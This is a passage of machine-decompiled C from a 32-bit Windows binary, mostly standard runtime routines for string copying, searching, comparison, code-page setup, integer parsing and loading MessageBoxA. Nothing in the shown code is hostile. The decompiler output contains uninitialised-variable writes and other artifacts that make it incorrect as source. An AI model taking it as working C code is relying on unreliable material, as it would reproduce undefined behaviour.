    function_404993((int32_t)&g110);
    // 0x404fa6
    return -1;
}

// Address range: 0x404fb0 - 0x404fb7
int32_t function_404fb0(int32_t a1) {
    // 0x404fb0
    int32_t v1; // 0x404fb0
    return function_405021(v1, (int32_t)&g110, (int32_t)&g110);
}

// Address range: 0x404fc0 - 0x405021
int32_t function_404fc0(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1; // 0x404fcb
    int32_t v3 = v1; // 0x404fcb
    int32_t result; // 0x405012
    if ((v1 & 3) != 0) {
        while (*(char *)v2 != 0) {
            // 0x404fd4
            v2++;
            v3 = v2;
            if ((v2 & 3) == 0) {
                goto lab_0x404fdc;
            }
        }
        // 0x40500f
        result = function_405021((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        return result;
    }
  lab_0x404fdc:;
    int32_t v4 = v3; // 0x404fc0
    uint32_t result4; // 0x404fdc
    while (true) {
        // 0x404fdc
        result4 = *(int32_t *)v4;
        if (((result4 ^ -0x7efeff00 ^ result4 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)result4 == 0) {
                // break -> 0x40501e
                break;
            }
            if ((result4 & 0xff00) == 0) {
                int32_t result2 = function_405021((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x40501c
                return result2;
            }
            if ((result4 & 0xff0000) == 0) {
                int32_t result3 = function_405021((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x405017
                return result3;
            }
            if (result4 < 0x1000000) {
                // 0x40500f
                result = function_405021((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
                return result;
            }
        }
        // 0x404fdc
        v4 += 4;
    }
    // 0x40501e
    return result4;
}

// Address range: 0x405021 - 0x4050a0
int32_t function_405021(int32_t a1, int32_t result, int32_t a3) {
    int32_t v1 = a3; // 0x40502b
    int32_t v2 = a3; // 0x40502b
    int32_t v3; // 0x405021
    if ((a3 & 3) != 0) {
        char v4 = *(char *)v1; // 0x40502d
        int32_t v5; // 0x405021
        while (v4 != 0) {
            // 0x405034
            v1++;
            *(char *)v5 = v4;
            int32_t v6 = v5 + 1; // 0x405036
            v5 = v6;
            v2 = v1;
            v3 = v6;
            if ((v1 & 3) == 0) {
                goto lab_0x405046;
            }
            v4 = *(char *)v1;
        }
        // 0x405098
        *(char *)v5 = 0;
        return result;
    }
  lab_0x405046:;
    int32_t v7 = v2; // 0x405021
    int32_t v8 = v3; // 0x405021
    int32_t v9; // 0x405021
    while (true) {
        int32_t v10 = v8;
        uint32_t v11 = *(int32_t *)v7;
        if (((v11 ^ -0x7efeff00 ^ v11 + 0x7efefeff) & -0x7efeff00) != 0) {
            // 0x405060
            v9 = v10;
            if ((char)v11 == 0) {
                // break -> 0x405098
                break;
            }
            if ((v11 & 0xff00) == 0) {
                // 0x40508f
                *(int16_t *)v10 = (int16_t)v11;
                return result;
            }
            if ((v11 & 0xff0000) == 0) {
                // 0x405082
                *(int16_t *)v10 = (int16_t)v11;
                *(char *)(v10 + 2) = 0;
                return result;
            }
            if (v11 < 0x1000000) {
                // 0x40507a
                *(int32_t *)v10 = v11;
                return result;
            }
        }
        // 0x405041
        *(int32_t *)v10 = v11;
        v7 += 4;
        v8 = v10 + 4;
    }
    // 0x405098
    *(char *)v9 = 0;
    return result;
}

// Address range: 0x4050a0 - 0x405239
int32_t function_4050a0(int32_t a1) {
    // 0x4050a0
    int32_t v1; // 0x4050a0
    int32_t v2; // 0x4050a0
    int32_t v3; // 0x4050a0
    int32_t CodePage = function_405239(a1, v1, v2, v3); // 0x4050ac
    if (CodePage == g80) {
        // 0x405234
        return 0;
    }
    int32_t v4 = &g40; // 0x4050c7
    if (CodePage == 0) {
      lab_0x405223:
        // 0x405223
        function_4052b6();
        // 0x405228
        function_4052df();
        // 0x405234
        return 0;
    }
    int32_t v5 = 0;
    while (*(int32_t *)v4 != CodePage) {
        // 0x4050d8
        v4 += 48;
        if (v4 >= (int32_t)&g43) {
            // 0x4050e3
            int32_t lpCPInfo; // bp-28, 0x4050a0
            GetCPInfo(CodePage, (struct _cpinfo *)&lpCPInfo);
            if (g69 == 0) {
                return -1;
            } else {
                goto lab_0x405223;
            }
        }
        v5++;
    }
    // 0x40514a
    __asm_rep_stosd_memset((char *)&g84, 0, 64);
    int32_t v6 = 48 * v5; // 0x40515c
    bool v7; // 0x4050a0
    char * v8 = v7 ? (char *)((int32_t)&g84 - 256) : (char *)((int32_t)&g84 + 256); // 0x40515f
    *v8 = 0;
    int32_t v9 = v6 + (int32_t)&g42;
    int32_t v10 = 0;
    char v11 = *(char *)v9; // 0x405166
    unsigned char v12; // 0x405174
    int32_t v13; // 0x4050a0
    int32_t v14; // 0x4050a0
    int32_t v15; // 0x4050a0
    char * v16; // 0x4050a0
    unsigned char v17; // 0x40516d
    int32_t v18; // 0x405193
    char v19; // 0x405194
    char * v20; // 0x405187
    if (v11 != 0) {
        // 0x40516d
        v16 = (char *)(v10 + (int32_t)&g39);
        v19 = v11;
        v15 = v9;
        v17 = *(char *)(v15 + 1);
        while (v17 != 0) {
            // 0x405174
            v12 = v19;
            if (v17 >= v12) {
                // 0x40517e
                v14 = v12;
                v20 = (char *)(v14 + (int32_t)&g85);
                *v20 = *v20 | *v16;
                v13 = v14 + 1;
                while (v14 != (int32_t)v17) {
                    // 0x405187
                    v14 = v13;
                    v20 = (char *)(v14 + (int32_t)&g85);
                    *v20 = *v20 | *v16;
                    v13 = v14 + 1;
                }
            }
            // 0x405192
            v18 = v15 + 2;
            v19 = *(char *)v18;
            if (v19 == 0) {
                // break -> 0x405199
                break;
            }
            v15 = v18;
            v17 = *(char *)(v15 + 1);
        }
    }
    int32_t v21 = v10 + 1; // 0x405199
    int32_t v22 = v9 + 8; // 0x4051a3
    while (v21 != 4) {
        // 0x405166
        v9 = v22;
        v10 = v21;
        v11 = *(char *)v9;
        if (v11 != 0) {
            // 0x40516d
            v16 = (char *)(v10 + (int32_t)&g39);
            v19 = v11;
            v15 = v9;
            v17 = *(char *)(v15 + 1);
            while (v17 != 0) {
                // 0x405174
                v12 = v19;
                if (v17 >= v12) {
                    // 0x40517e
                    v14 = v12;
                    v20 = (char *)(v14 + (int32_t)&g85);
                    *v20 = *v20 | *v16;
                    v13 = v14 + 1;
                    while (v14 != (int32_t)v17) {
                        // 0x405187
                        v14 = v13;
                        v20 = (char *)(v14 + (int32_t)&g85);
                        *v20 = *v20 | *v16;
                        v13 = v14 + 1;
                    }
                }
                // 0x405192
                v18 = v15 + 2;
                v19 = *(char *)v18;
                if (v19 == 0) {
                    // break -> 0x405199
                    break;
                }
                v15 = v18;
                v17 = *(char *)(v15 + 1);
            }
        }
        // 0x405199
        v21 = v10 + 1;
        v22 = v9 + 8;
    }
    // 0x4051a5
    g82 = 1;
    g80 = CodePage;
    int32_t v23 = function_405283(CodePage); // 0x4051b8
    int32_t v24 = v6 + (int32_t)&g41; // 0x4051bd
    g81 = *(int32_t *)v24;
    int32_t v25 = v7 ? -4 : 4; // 0x4051c8
    int32_t v26 = v25 + (int32_t)&g81; // 0x4051c8
    int32_t v27 = v24 + v25; // 0x4051c8
    *(int32_t *)v26 = *(int32_t *)v27;
    g86 = v23;
    *(int32_t *)(v26 + v25) = *(int32_t *)(v27 + v25);
    // 0x405228
    function_4052df();
    // 0x405234
    return 0;
}

// Address range: 0x405239 - 0x40523d
int32_t function_405239(int32_t result, int32_t a2, int32_t a3, int32_t a4) {
    // 0x405239
    return result;
}

// Address range: 0x405283 - 0x4052b6
int32_t function_405283(int32_t a1) {
    int32_t result = 1041; // 0x405283
    switch (a1) {
        case 936: {
            // 0x40529b
            return 2052;
        }
        default: {
            int32_t v1 = a1 - 949; // 0x405293
            result = 1042;
            if (v1 != 0) {
                // 0x405298
                result = v1 == 1 ? 1028 : 0;
            }
        }
        case 932: {
            // 0x40529b
            return result;
        }
    }
}

// Address range: 0x4052b6 - 0x4052df
int32_t function_4052b6(void) {
    // 0x4052b6
    __asm_rep_stosd_memset((char *)&g84, 0, 64);
    bool v1; // 0x4052b6
    char * v2 = v1 ? (char *)((int32_t)&g84 - 256) : (char *)((int32_t)&g84 + 256); // 0x4052c3
    *v2 = 0;
    g80 = 0;
    g82 = 0;
    g86 = 0;
    g81 = 0;
    int32_t * v3 = v1 ? (int32_t *)((int32_t)&g81 - 4) : (int32_t *)((int32_t)&g81 + 4); // 0x4052db
    *v3 = 0;
    int32_t * v4 = v1 ? (int32_t *)((int32_t)&g81 - 8) : (int32_t *)((int32_t)&g81 + 8); // 0x4052dc
    *v4 = 0;
    return 0;
}

// Address range: 0x4052df - 0x405464
int32_t function_4052df(void) {
    // 0x4052df
    int32_t lpCPInfo; // bp-24, 0x4052df
    GetCPInfo(g80, (struct _cpinfo *)&lpCPInfo);
    int32_t v1 = 0; // 0x40541a
    int32_t v2; // 0x4052df
    while (true) {
      lab_0x40541f:
        // 0x40541f
        v2 = v1;
        int32_t v3; // 0x4052df
        if (v2 < 91) {
            char * v4 = (char *)(v2 + (int32_t)&g85); // 0x405429
            *v4 = *v4 | 16;
            // 0x405435
            v3 = v2 + 32;
            *(char *)(v2 + (int32_t)&g83) = (char)v3;
            goto lab_0x40545c;
        } else {
            if (v2 < 123) {
                char * v5 = (char *)(v2 + (int32_t)&g85); // 0x405447
                *v5 = *v5 | 32;
                // 0x405435
                v3 = v2 + 224;
                *(char *)(v2 + (int32_t)&g83) = (char)v3;
                goto lab_0x40545c;
            } else {
                // 0x405455
                *(char *)(v2 + (int32_t)&g83) = 0;
                goto lab_0x40545c;
            }
        }
    }
    // 0x405461
    return 256;
  lab_0x40545c:
    // 0x40545c
    v1 = v2 + 1;
    if (v1 == 256) {
        return 256;
    }
    goto lab_0x40541f;
}

// Address range: 0x405464 - 0x405480
int32_t function_405464(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405464
    int32_t result; // 0x405464
    if (g100 == 0) {
        int32_t v1 = function_4050a0(-3); // 0x40546f
        g100 = 1;
        result = v1;
    }
    // 0x40547f
    return result;
}

// Address range: 0x405480 - 0x405497
int32_t function_405480(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405480
    return function_405497(a1, a2, a3, 0);
}

// Address range: 0x405497 - 0x40569f
int32_t function_405497(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    // 0x405497
    int32_t v1; // bp-28, 0x405497
    int32_t v2 = &v1; // 0x4054a3
    int32_t * v3 = (int32_t *)(v2 - 4);
    int32_t * v4 = (int32_t *)(v2 - 8);
    int32_t v5 = a1;
    unsigned char v6 = *(char *)v5;
    int32_t v7 = v6;
    int32_t v8; // 0x405497
    int32_t v9; // 0x4054be
    if (g44 < 2) {
        // 0x4054c7
        v8 = (int32_t)(*(char *)(g31 + 2 * v7) & 8);
    } else {
        // 0x4054b8
        *v3 = 8;
        *v4 = v7;
        v9 = function_406555((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        v8 = v9;
    }
    int32_t v10 = v5 + 1;
    while (v8 != 0) {
        // 0x4054af
        v5 = v10;
        v6 = *(char *)v5;
        v7 = v6;
        if (g44 < 2) {
            // 0x4054c7
            v8 = (int32_t)(*(char *)(g31 + 2 * v7) & 8);
        } else {
            // 0x4054b8
            *v3 = 8;
            *v4 = v7;
            v9 = function_406555((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
            v8 = v9;
        }
        // 0x4054d6
        v10 = v5 + 1;
    }
    int32_t v11; // 0x405497
    int32_t v12; // 0x405497
    int32_t v13; // 0x405497
    int32_t v14; // 0x405497
    if (v6 != 45) {
        // 0x4054ed
        v12 = a4;
        v14 = v10;
        v13 = a4;
        v11 = v7;
        if (v6 != 43) {
            goto lab_0x4054f8;
        } else {
            goto lab_0x4054f2;
        }
    } else {
        // 0x4054e7
        v12 = a4 | 2;
        goto lab_0x4054f2;
    }
  lab_0x4055fb:;
    // 0x4055fb
    int32_t v15; // 0x405497
    int32_t v16 = v15; // 0x405603
    int32_t v17; // 0x405497
    int32_t v18 = v17 + 1; // 0x405603
    int32_t v19; // 0x405497
    int32_t v20 = v19; // 0x405603
    int32_t v21 = (int32_t)*(char *)v17; // 0x405603
    goto lab_0x40556c;
  lab_0x4054f8:
    if (a3 > 36 || a3 == 1) {
        // 0x40568f
        if (a2 != 0) {
            // 0x405696
            *(int32_t *)a2 = a1;
        }
        // 0x40569a
        return 0;
    }
    // 0x405515
    *v3 = 16;
    char * v34; // 0x405497
    int32_t v35; // 0x405497
    int32_t v32; // 0x405497
    int32_t v36; // 0x405497
    if (a3 != 0) {
        // 0x405540
        v36 = v14;
        v32 = a3;
        v35 = v11;
        if (a3 == 16 == v11 == 48) {
            // 0x405540
            v34 = (char *)v14;
            goto lab_0x40554a;
        } else {
            goto lab_0x40555c;
        }
    } else {
        // 0x40551c
        v36 = v14;
        v32 = 10;
        v35 = v11;
        if (v11 == 48) {
            char * v37 = (char *)v14;
            v34 = v37;
            v36 = v14;
            v32 = 8;
            v35 = 48;
            switch (*v37) {
                case 120: {
                    goto lab_0x40554a;
                }
                case 88: {
                    goto lab_0x40554a;
                }
                default: {
                    goto lab_0x40555c;
                }
            }
        } else {
            goto lab_0x40555c;
        }
    }
  lab_0x4054f2:
    // 0x4054f2
    v14 = v5 + 2;
    v13 = v12;
    v11 = (int32_t)*(char *)v10;
    goto lab_0x4054f8;
  lab_0x40555c:;
    uint32_t v33 = 0xffffffff / v32;
    v16 = 0;
    v18 = v36;
    v20 = v13;
    v21 = v35;
    int32_t v23; // 0x405497
    int32_t v24; // 0x405497
    while (true) {
      lab_0x40556c:;
        int32_t v22 = v21;
        v23 = v20;
        v17 = v18;
        v24 = v16;
        int32_t v25; // 0x405497
        if (g44 < 2) {
            // 0x405584
            v25 = (int32_t)(*(char *)(g31 + 2 * v22) & 4);
        } else {
            // 0x405578
            *v3 = 4;
            *v4 = v22;
            int32_t v26 = function_406555(v17, (int32_t)&g110, (int32_t)&g110); // 0x40557b
            v25 = v26;
        }
        // 0x40558f
        int32_t v27; // 0x405497
        if (v25 == 0) {
            // 0x40559b
            int32_t v28; // 0x405497
            if (g44 < 2) {
                // 0x4055af
                v28 = (int32_t)(*(int16_t *)(g31 + 2 * v22) & 259);
            } else {
                // 0x4055a4
                *v3 = 259;
                *v4 = v22;
                int32_t v29 = function_406555((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x4055a6
                v28 = v29;
            }
            // 0x4055ba
            if (v28 == 0) {
                // break -> 0x405608
                break;
            }
            // 0x4055be
            *v3 = 0x1000000 * v22 / 0x1000000;
            int32_t v30 = function_406489((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x4055c2
            v27 = v30 - 55;
        } else {
            // 0x405593
            v27 = 0x1000000 * v22 / 0x1000000 - 48;
        }
        uint32_t v31 = v27;
        if (v31 >= v32) {
            // break -> 0x405608
            break;
        }
        if (v24 < v33) {
            // 0x4055f2
            v15 = v31 + v24 * v32;
            v19 = v23 | 8;
            goto lab_0x4055fb;
        } else {
            if (v24 != v33) {
                // 0x4055ec
                v15 = v24;
                v19 = v23 | 12;
                goto lab_0x4055fb;
            } else {
                if (v31 > 0xffffffff % v32) {
                    // 0x4055ec
                    v15 = v24;
                    v19 = v23 | 12;
                    goto lab_0x4055fb;
                } else {
                    // 0x4055f2
                    v15 = v31 + v24 * v32;
                    v19 = v23 | 8;
                    goto lab_0x4055fb;
                }
            }
        }
    }
    int32_t v38 = v17 - 1; // 0x40560b
    int32_t v39; // 0x405497
    int32_t v40; // 0x405497
    int32_t v41; // 0x405497
    if ((v23 & 8) != 0) {
        // 0x405626
        v39 = v23 & 1;
        if ((v23 & 4) != 0) {
            goto lab_0x40564c;
        } else {
            // 0x405630
            if (v39 != 0) {
                goto lab_0x405673;
            } else {
                if ((v23 & 2) == 0) {
                    // 0x405643
                    v40 = v24;
                    v41 = v38;
                    if (v24 < 0) {
                        goto lab_0x40564c;
                    } else {
                        goto lab_0x405673;
                    }
                } else {
                    // 0x40563a
                    v40 = v24;
                    v41 = v38;
                    if (v24 > -1 || v24 == -0x80000000) {
                        goto lab_0x405673;
                    } else {
                        goto lab_0x40564c;
                    }
                }
            }
        }
    } else {
        // 0x405616
        v40 = 0;
        v41 = a2 == 0 ? v38 : a1;
        goto lab_0x405673;
    }
  lab_0x40554a:;
    char v42 = *v34; // 0x40554a
    v36 = v14;
    v32 = 16;
    v35 = 48;
    if (v42 != 120 != v42 != 88) {
        // 0x405554
        v36 = v14 + 2;
        v32 = 16;
        v35 = (int32_t)*(char *)(v14 + 1);
    }
    goto lab_0x40555c;
  lab_0x40564c:
    // 0x40564c
    g49 = 34;
    v40 = -1;
    v41 = v38;
    if (v39 == 0) {
        // 0x405662
        v40 = (v23 & 2) == 0 ? 0x7fffffff : -0x80000000;
        v41 = v38;
    }
    goto lab_0x405673;
  lab_0x405673:;
    int32_t v43 = v40;
    if (a2 != 0) {
        // 0x405677
        *(int32_t *)a2 = v41;
    }
    // 0x40569a
    return (v23 & 2) == 0 ? v43 : -v43;
}

// Address range: 0x4056a0 - 0x4056a5
int32_t function_4056a0(int32_t a1) {
    // 0x4056a0
    int32_t v1; // 0x4056a0
    return v1 - 1;
}

// Address range: 0x4056b0 - 0x40576c
int32_t function_4056b0(int32_t a1, int32_t a2) {
    int32_t v1 = a2 & 255; // 0x4056b2
    int32_t v2 = 256 * v1; // 0x4056b9
    int32_t v3 = v2; // 0x4056c6
    int32_t v4 = a1; // 0x4056c6
    int32_t result; // 0x4056b0
    if ((a1 & 3) == 0) {
      lab_0x4056db:;
        int32_t v5 = v3 | v1; // 0x4056db
        char v6 = v5;
        int32_t v7 = v4; // 0x4056e4
        while (true) {
            int32_t v8 = v7;
            uint32_t v9 = *(int32_t *)v8; // 0x4056e6
            int32_t v10 = v9 ^ (0x10000 * v5 | v5); // 0x4056f1
            if (((v10 ^ -0x7efeff00 ^ v10 + 0x7efefeff) & -0x7efeff00) != 0) {
                char v11 = v9; // 0x40572b
                result = v8;
                if (v11 == v6) {
                    // break -> 0x405724
                    break;
                }
                // 0x40572f
                result = 0;
                if (v11 == 0) {
                    // break -> 0x405724
                    break;
                }
                char v12 = v9 / 256; // 0x405733
                if (v12 == v6) {
                    // 0x40575e
                    return v8 + 1;
                }
                // 0x405737
                result = 0;
                if (v12 == 0) {
                    // break -> 0x405724
                    break;
                }
                char v13 = v9 / 0x10000; // 0x40573e
                if (v13 == v6) {
                    // 0x405757
                    return v8 + 2;
                }
                // 0x405742
                result = 0;
                if (v13 == 0) {
                    // break -> 0x405724
                    break;
                }
                char v14 = v9 / 0x1000000; // 0x405746
                if (v14 == v6) {
                    // 0x405750
                    return v8 + 3;
                }
                // 0x40574a
                result = 0;
                if (v14 == 0) {
                    // break -> 0x405724
                    break;
                }
            } else {
                int32_t v15 = v9 + 0x7efefeff; // 0x4056f3
                int32_t v16 = v9 ^ -0x7efeff00 ^ v15; // 0x4056ff
                if ((v16 & -0x7efeff00) != 0) {
                    // 0x405713
                    result = 0;
                    if (v15 <= -1 != ((v16 & 0x1010100) == 0)) {
                        // break -> 0x405724
                        break;
                    }
                }
            }
            // 0x4056e6
            v7 = v8 + 4;
        }
    } else {
        int32_t v17 = a1; // 0x4056ca
        char v18 = *(char *)v17; // 0x4056c8
        int32_t v19 = v2; // 0x4056cd
        if (v18 == (char)a2) {
            v19 = function_4056a0((int32_t)&g110);
        }
        // 0x4056cf
        result = 0;
        while (v18 != 0) {
            // 0x4056d3
            v17++;
            v3 = v19;
            v4 = v17;
            if ((v17 & 3) == 0) {
                goto lab_0x4056db;
            }
            v18 = *(char *)v17;
            if (v18 == (char)a2) {
                v19 = function_4056a0((int32_t)&g110);
            }
            // 0x4056cf
            result = 0;
        }
    }
    // 0x405724
    return result;
}

// Address range: 0x405770 - 0x4057f0
int32_t function_405770(int32_t * a1, int32_t * a2) {
    int32_t result = (int32_t)a1;
    unsigned char result2 = *(char *)a2; // 0x405777
    if (result2 == 0) {
        // 0x4057a4
        return result;
    }
    int32_t v1 = (int32_t)a2;
    char v2 = *(char *)(v1 + 1); // 0x405781
    if (v2 == 0) {
        // 0x4057d7
        return result2;
    }
    // 0x405788
    int32_t v3; // 0x405770
    int32_t v4; // 0x405770
    while (true) {
      lab_0x405788:;
        char v5 = *(char *)a1; // 0x40578e
        int32_t v6 = result + 1; // 0x405790
        v4 = v6;
        if (v5 == result2) {
            goto lab_0x4057aa;
        } else {
            // 0x405795
            v3 = v6;
            if (v5 == 0) {
                // break -> 0x4057a4
                break;
            }
            goto lab_0x405799;
        }
    }
    // 0x4057a4
    return 0;
  lab_0x4057aa:;
    int32_t v7 = v4;
    char v8 = *(char *)v7; // 0x4057aa
    int32_t v9 = v7 + 1; // 0x4057ac
    char v10 = v8; // 0x4057af
    int32_t v11 = v9; // 0x4057af
    int32_t v12 = v9; // 0x4057af
    if (v8 != v2) {
        goto lab_0x40579c;
    } else {
        int32_t v13 = v1;
        int32_t v14 = v13 + 2; // 0x4057b4
        char v15 = *(char *)v14; // 0x4057b4
        while (v15 != 0) {
            int32_t v16 = v12;
            if (*(char *)v16 != v15) {
                // break -> 0x405788
                break;
            }
            char v17 = *(char *)(v13 + 3); // 0x4057c4
            if (v17 == 0) {
                // 0x4057e3
                return v7 - 1;
            }
            // 0x4057cb
            v12 = v16 + 2;
            if (*(char *)(v16 + 1) != v17) {
                // break -> 0x405788
                break;
            }
            v13 = v14;
            v14 = v13 + 2;
            v15 = *(char *)v14;
        }
        // 0x4057e3
        return v7 - 1;
        // 0x405788
        goto lab_0x405788;
    }
  lab_0x40579c:;
    int32_t v18 = v11;
    char v19 = v10;
    v4 = v18;
    if (result2 == v19) {
        goto lab_0x4057aa;
    } else {
        // 0x4057a0
        v3 = v18;
        if (v19 == 0) {
            return 0;
        }
        goto lab_0x405799;
    }
  lab_0x405799:
    // 0x405799
    v10 = *(char *)v3;
    v11 = v3 + 1;
    goto lab_0x40579c;
}

// Address range: 0x4057f0 - 0x405828
int32_t function_4057f0(char * a1, int32_t * a2, int32_t a3) {
    // 0x4057f0
    if (a3 == 0) {
        // 0x405821
        return 0;
    }
    int32_t v1 = (int32_t)a1; // 0x4057fd
    bool v2; // 0x4057f0
    int32_t v3 = v2 ? -1 : 1;
    int32_t v4 = a3; // 0x405804
    int32_t v5 = v1; // 0x405804
    int32_t v6 = 0; // 0x405804
    while (v4 != 0) {
        int32_t v7 = v5;
        v4--;
        v5 = v7 + v3;
        v6 = v4;
        if (*(char *)v7 == 0) {
            // break ->
            break;
        }
        v6 = 0;
    }
    int32_t v8 = a3 - v6; // 0x40580f
    int32_t v9 = v1;
    int32_t v10 = (int32_t)a2;
    int32_t v11 = v10; // 0x40580f
    int32_t v12 = v9; // 0x40580f
    while (v8 != 0) {
        int32_t v13 = v9 + v3; // 0x40580f
        int32_t v14 = v10 + v3; // 0x40580f
        v8--;
        v11 = v14;
        v12 = v13;
        if (*(char *)v10 != *(char *)v9) {
            // break ->
            break;
        }
        v9 = v13;
        v10 = v14;
        v11 = v10;
        v12 = v9;
    }
    unsigned char v15 = *(char *)(v11 - 1); // 0x405811
    unsigned char v16 = *(char *)(v12 - 1); // 0x405816
    int32_t result = -1; // 0x405819
    if (v15 <= v16) {
        // 0x40581b
        result = 1;
        if (v15 == v16) {
            // 0x405821
            return 0;
        }
    }
    // 0x405821
    return result;
}

// Address range: 0x405830 - 0x40585f
int32_t function_405830(int32_t result) {
    // 0x405830
    int32_t v1; // 0x405830
    int32_t v2 = &v1; // 0x405836
    int32_t v3 = v2; // 0x40583a
    uint32_t v4; // 0x405830
    if (v4 < 0x1000) {
        // 0x405850
        int32_t v5; // 0x405830
        *(int32_t *)(-4 - v5 + v2) = result;
        return result;
    }
    v3 -= 0x1000;
    int32_t v6; // 0x405830
    int32_t v7 = v6 - 0x1000; // 0x405842
    while (v7 >= 0x1000) {
        // 0x40583c
        v3 -= 0x1000;
        v7 -= 0x1000;
    }
    // 0x405850
    *(int32_t *)(-4 - v7 + v3) = result;
    return result;
}

// Address range: 0x40585f - 0x4058e8
int32_t function_40585f(int32_t * a1, char * a2, int32_t a3) {
    // 0x40585f
    int32_t v1; // bp-12, 0x40585f
    int32_t * v2 = &v1; // 0x40586a
    if (g70 == 0) {
        int32_t * moduleHandle = LoadLibraryA("user32.dll"); // 0x405871
        if (moduleHandle == NULL) {
            // 0x4058e0
            return 0;
        }
        int32_t (*func)() = GetProcAddress(moduleHandle, "MessageBoxA"); // 0x405889
        g70 = (int32_t)func;
        if (func == NULL) {
            // 0x4058e0
            return 0;
        }
        int32_t (*func2)() = GetProcAddress(moduleHandle, "GetActiveWindow"); // 0x40589a
        int32_t v3 = (int32_t)moduleHandle; // bp-40, 0x4058a1
        g71 = (int32_t)func2;
        g72 = (int32_t)GetProcAddress(moduleHandle, "GetLastActivePopup");
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t result = 0; // 0x4058b5
    int32_t v5 = 0; // 0x4058b5
    int32_t v6 = v4; // 0x4058b5
    if (g71 != 0) {
        // 0x4058bf
        result = 0;
        v5 = g71;
        v6 = v4;
        if (g72 != 0) {
            int32_t v7 = v4 - 4; // 0x4058c8
            *(int32_t *)v7 = g71;
            result = g72;
            v5 = g72;
            v6 = v7;
        }
    }
    int32_t v8 = v6;
    *(int32_t *)(v8 - 4) = *(int32_t *)(v8 + 24);
    *(int32_t *)(v8 - 8) = *(int32_t *)(v8 + 20);
    *(int32_t *)(v8 - 12) = *(int32_t *)(v8 + 16);
    *(int32_t *)(v8 - 16) = v5;
    // 0x4058e0
    return result;
}

// Address range: 0x4058f0 - 0x4059ee
int32_t function_4058f0(int32_t result, char * a2, int32_t a3) {
    if (a3 == 0) {
        // 0x405942
        return result;
    }
    int32_t v1 = (int32_t)a2; // 0x4058fd
    int32_t v2 = a3; // 0x40590b
    int32_t v3 = v1; // 0x40590b
    int32_t v4 = result; // 0x40590b
    int32_t v5; // 0x4058f0
    int32_t v6; // 0x4058f0
    int32_t v7; // 0x4058f0
    int32_t v8; // 0x4058f0
    int32_t v9; // 0x4058f0
    int32_t v10; // 0x4058f0
    int32_t v11; // 0x4058f0
    if ((v1 & 3) != 0) {
        char v12 = *(char *)v3; // 0x405914
        *(char *)v4 = v12;
        v2--;
        while (v2 != 0) {
            // 0x40591d
            v4++;
            if (v12 == 0) {
                // 0x40594a
                v6 = v2;
                v9 = v4;
                v7 = v2;
                v10 = v4;
                if ((v4 & 3) == 0) {
                    goto lab_0x405964;
                } else {
                    goto lab_0x405952;
                }
            }
            // 0x405921
            v3++;
            if ((v3 & 3) == 0) {
                // 0x405929
                v5 = v2;
                v11 = v3;
                v8 = v4;
                if (v2 >= 4) {
                    goto lab_0x405981;
                } else {
                    goto lab_0x405930;
                }
            }
            v12 = *(char *)v3;
            *(char *)v4 = v12;
            v2--;
        }
      lab_0x405942:
        // 0x405942
        return result;
    }
    // 0x40590d
    v2 = a3;
    v3 = v1;
    v4 = result;
    int32_t v13 = a3; // 0x405910
    v11 = v1;
    v8 = result;
    if (a3 >= 4) {
        goto lab_0x405981;
    } else {
        goto lab_0x405935;
    }
  lab_0x405981:;
    uint32_t v14 = *(int32_t *)v3;
    int32_t v15; // 0x4058f0
    if (((v14 ^ -0x7efeff00 ^ v14 + 0x7efefeff) & -0x7efeff00) != 0) {
        if ((char)v14 == 0) {
            // 0x4059cb
            *(int32_t *)v15 = 0;
            goto lab_0x4059cf;
        }
        if ((v14 & 0xff00) == 0) {
            // 0x4059c1
            *(int32_t *)v15 = v14 & 255;
            goto lab_0x4059cf;
        }
        if ((v14 & 0xff0000) == 0) {
            // 0x4059b7
            *(int32_t *)v15 = v14 & 0xffff;
            goto lab_0x4059cf;
        }
        if (v14 < 0x1000000) {
            // 0x4059b3
            *(int32_t *)v15 = v14;
            goto lab_0x4059cf;
        }
    }
    int32_t v16 = v3 + 4; // 0x405991
    *(int32_t *)v4 = v14;
    int32_t v17 = v4 + 4; // 0x40597b
    int32_t v18 = v2 / 4 - 1; // 0x40597e
    v5 = v2;
    v11 = v16;
    v8 = v17;
    int32_t v19 = v18; // 0x40597f
    int32_t v20 = v16; // 0x40597f
    int32_t v21 = v17; // 0x40597f
    while (v18 != 0) {
        // 0x405981
        v14 = *(int32_t *)v20;
        if (((v14 ^ -0x7efeff00 ^ v14 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)v14 == 0) {
                // 0x4059cb
                *(int32_t *)v15 = 0;
                goto lab_0x4059cf;
            }
            if ((v14 & 0xff00) == 0) {
                // 0x4059c1
                *(int32_t *)v15 = v14 & 255;
                goto lab_0x4059cf;
            }
            if ((v14 & 0xff0000) == 0) {
                // 0x4059b7
                *(int32_t *)v15 = v14 & 0xffff;
                goto lab_0x4059cf;
            }
            if (v14 < 0x1000000) {
                // 0x4059b3
                *(int32_t *)v15 = v14;
                goto lab_0x4059cf;
            }
        }
        // 0x405979
        v16 = v20 + 4;
        *(int32_t *)v21 = v14;
        v17 = v21 + 4;
        v18 = v19 - 1;
        v5 = v2;
        v11 = v16;
        v8 = v17;
        v19 = v18;
        v20 = v16;
        v21 = v17;
    }
    goto lab_0x405930;
  lab_0x405935:;
    int32_t v22 = v11;
    int32_t v23 = v13;
    char v24 = *(char *)v22; // 0x405935
    *(char *)v8 = v24;
    int32_t v25 = v8 + 1; // 0x40593a
    int32_t v26 = v23; // 0x40593d
    int32_t v27 = v25; // 0x40593d
    while (v24 != 0) {
        int32_t v28 = v23 - 1; // 0x40593f
        if (v28 == 0) {
            // 0x405942
            return result;
        }
        v22++;
        v23 = v28;
        v24 = *(char *)v22;
        *(char *)v25 = v24;
        v25++;
        v26 = v23;
        v27 = v25;
    }
    goto lab_0x40596e;
  lab_0x405930:
    // 0x405930
